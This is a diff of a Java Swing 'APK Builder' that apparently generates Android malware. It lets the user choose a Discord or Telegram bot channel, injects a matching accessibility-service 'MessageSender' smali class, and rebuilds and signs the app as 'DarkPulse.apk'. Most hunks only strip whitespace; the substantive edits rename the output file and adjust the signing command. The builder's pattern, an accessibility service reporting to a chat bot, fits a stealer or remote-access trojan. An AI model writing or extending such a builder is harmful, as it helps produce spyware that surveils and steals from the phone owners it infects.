@@ -19,12 +19,12 @@ public class buildApk {
     private static final Font BUTTON_FONT = new Font("Segoe UI", Font.BOLD, 14);
 	static boolean isDiscord = false;
 	static boolean isTelegram = false;
-	
+
     private static Image backgroundImage;
     private static JTextPane logArea;
     private static StyledDocument logDocument;
     private static SimpleDateFormat timeFormat = new SimpleDateFormat("HH:mm:ss");
-    
+
     // New fields for Telegram input panels
     private static JPanel discordInputPanel;
     private static JPanel telegramInputPanel;
@@ -42,14 +42,14 @@ public class buildApk {
 
         SwingUtilities.invokeLater(() -> createAndShowGUI());
     }
-	
+
     private static void createAndShowGUI() {
 		backgroundImage = new ImageIcon("./Resources/backgroundimg.png").getImage();
         JFrame frame = new JFrame("APK Builder");
         frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         frame.setSize(600, 700); // Increased height for additional fields
         frame.setLocationRelativeTo(null);
-		
+
 
         JPanel mainPanel = new JPanel() {
 			@Override
@@ -115,7 +115,7 @@ public class buildApk {
         telegramInputPanel.setLayout(new GridLayout(3, 1, 10, 10));
         telegramInputPanel.setBackground(BACKGROUND_COLOR);
         telegramInputPanel.setBorder(BorderFactory.createEmptyBorder(10, 0, 10, 0));
-		
+
 
         // Bot Number field
         JPanel botNumberPanel = new JPanel(new BorderLayout(5, 5));
@@ -174,7 +174,7 @@ public class buildApk {
 
         JButton buildButton = createStyledButton("BUILD APK");
         JButton signButton = createStyledButton("SIGN APK");
-        
+
         buttonPanel.add(buildButton);
         buttonPanel.add(signButton);
 
@@ -195,7 +195,7 @@ public class buildApk {
 
         // Button listeners
         buildButton.addActionListener(e -> {
-			String selectedOption = discordRadioButton.isSelected() ? "Discord" : 
+			String selectedOption = discordRadioButton.isSelected() ? "Discord" :
 									telegramRadioButton.isSelected() ? "Telegram" : "None";
 
 			// Directory logic
@@ -226,7 +226,7 @@ public class buildApk {
 				logError("Please select a messaging platform");
 				return;
 			}
-			
+
 			if (isDiscord){
 				Path sourcePathDiscord = Paths.get("./discord_version/smali_classes4/com/MyAccessibilityService$MessageSender.smali");
 				Path destinationPath = Paths.get("MyAccessibilityService$MessageSender.smali"); // This will copy to the current directory
@@ -262,7 +262,7 @@ public class buildApk {
 
 			// Build APK
 			String apkToolPath = "./Resources/apktool.jar";
-			String outputApk = "./Output/app.apk";
+			String outputApk = "./Output/DarkPulse.apk";
 			String[] command = {
 				"java", "-jar", apkToolPath, "b", directoryPath, "-o", outputApk, "--use-aapt2"
 			};
@@ -273,8 +273,8 @@ public class buildApk {
 
         signButton.addActionListener(e -> {
             String signToolPath = "./Resources/uber-apk-signer-1.3.0.jar";
-            String apkToSign = "./Output/app.apk";
-            String[] signCommand = {"java", "-jar", signToolPath, "--apks", apkToSign};
+            String apkToSign = "./Output/DarkPulse.apk";
+            String[] signCommand = {"java", "--enable-native-access=ALL-UNNAMED", "-jar", signToolPath, "--apks", apkToSign};
 
             executeCommand(signCommand, "Signing APK...", "APK signed successfully");
         });
@@ -284,7 +284,7 @@ public class buildApk {
 
         // Select Discord by default
         discordRadioButton.setSelected(true);
-        
+
         // Final frame setup
         frame.add(mainPanel);
         frame.setVisible(true);
@@ -326,10 +326,10 @@ public class buildApk {
             try {
                 Style style = logArea.addStyle("CurrentStyle", null);
                 StyleConstants.setForeground(style, color);
-                
+
                 String timeStamp = timeFormat.format(new Date());
                 String fullMessage = String.format("[%s] %s%n", timeStamp, message);
-                
+
                 logDocument.insertString(logDocument.getLength(), fullMessage, style);
                 logArea.setCaretPosition(logDocument.getLength());
             } catch (BadLocationException e) {
@@ -363,20 +363,20 @@ public class buildApk {
             @Override
             protected void paintComponent(Graphics g) {
                 super.paintComponent(g);
-                
+
                 if (getText().isEmpty() && !hasFocus()) {
                     Graphics2D g2d = (Graphics2D) g.create();
                     g2d.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
                     g2d.setColor(Color.GRAY);
                     g2d.setFont(getFont().deriveFont(Font.ITALIC));
-                    g2d.drawString(placeholder, 
-                        getInsets().left + 5, 
+                    g2d.drawString(placeholder,
+                        getInsets().left + 5,
                         g2d.getFontMetrics().getMaxAscent() + getInsets().top + 2);
                     g2d.dispose();
                 }
             }
         };
-        
+
         textField.setFont(MAIN_FONT);
         textField.setBorder(BorderFactory.createCompoundBorder(
             BorderFactory.createLineBorder(ACCENT_COLOR),
@@ -405,7 +405,7 @@ public class buildApk {
         button.setBackground(PRIMARY_COLOR);
         button.setFocusPainted(false);
         button.setBorder(BorderFactory.createEmptyBorder(10, 20, 10, 20));
-        
+
         button.addMouseListener(new MouseAdapter() {
             public void mouseEntered(MouseEvent e) {
                 button.setBackground(PRIMARY_COLOR);
@@ -416,33 +416,33 @@ public class buildApk {
                 button.setCursor(new Cursor(Cursor.DEFAULT_CURSOR));
             }
         });
-        
+
         return button;
     }
 
     private static void executeCommand(String[] command, String startMessage, String successMessage) {
         logInfo(startMessage);
-        
+
         SwingWorker<Void, String> worker = new SwingWorker<>() {
             @Override
             protected Void doInBackground() throws Exception {
                 ProcessBuilder processBuilder = new ProcessBuilder(command);
                 Process process = processBuilder.start();
-                
+
                 // Capture output in background
                 StreamGobbler outputGobbler = new StreamGobbler(process.getInputStream(), "OUTPUT");
                 StreamGobbler errorGobbler = new StreamGobbler(process.getErrorStream(), "ERROR");
-                
+
                 outputGobbler.start();
                 errorGobbler.start();
-                
+
                 int exitCode = process.waitFor();
                 if (exitCode == 0) {
                     publish(successMessage);
                 } else {
                     publish("Process failed with exit code: " + exitCode);
                 }
-                
+
                 return null;
             }
 
@@ -464,13 +464,13 @@ public class buildApk {
                     logSuccess(successMessage);
 					if (isDiscord) {
 						Path sourcePath = Paths.get("MyAccessibilityService$MessageSender.smali");
-        
+
 						// Define the target directory
 						Path targetDirectory = Paths.get("./discord_version/smali_classes4/com/");
-						
+
 						// Create the target path
 						Path targetPath = targetDirectory.resolve(sourcePath.getFileName());
-						
+
 						try {
 							// Ensure the target directory exists
 							if (!Files.exists(targetDirectory)) {
@@ -479,7 +479,7 @@ public class buildApk {
 
 							// Move the file, replacing if it already exists
 							Files.move(sourcePath, targetPath, StandardCopyOption.REPLACE_EXISTING);
-							
+
 							System.out.println("File moved successfully!");
 						} catch (IOException e) {
 							System.err.println("An error occurred: " + e.getMessage());
@@ -487,13 +487,13 @@ public class buildApk {
 					}
 					else if (isTelegram) {
 						Path sourcePath = Paths.get("MyAccessibilityService$MessageSender.smali");
-        
+
 						// Define the target directory
 						Path targetDirectory = Paths.get("./telegram_version/smali_classes4/com/");
-						
+
 						// Create the target path
 						Path targetPath = targetDirectory.resolve(sourcePath.getFileName());
-						
+
 						try {
 							// Ensure the target directory exists
 							if (!Files.exists(targetDirectory)) {
@@ -502,7 +502,7 @@ public class buildApk {
 
 							// Move the file, replacing if it already exists
 							Files.move(sourcePath, targetPath, StandardCopyOption.REPLACE_EXISTING);
-							
+
 							System.out.println("File moved successfully!");
 						} catch (IOException e) {
 							System.err.println("An error occurred: " + e.getMessage());
@@ -513,7 +513,7 @@ public class buildApk {
                 }
             }
         };
-        
+
         worker.execute();
     }
 
@@ -541,7 +541,7 @@ public class buildApk {
                     });
                 }
             } catch (IOException e) {
-                SwingUtilities.invokeLater(() -> 
+                SwingUtilities.invokeLater(() ->
                     logError("Error reading " + type + " stream: " + e.getMessage())
                 );
             }
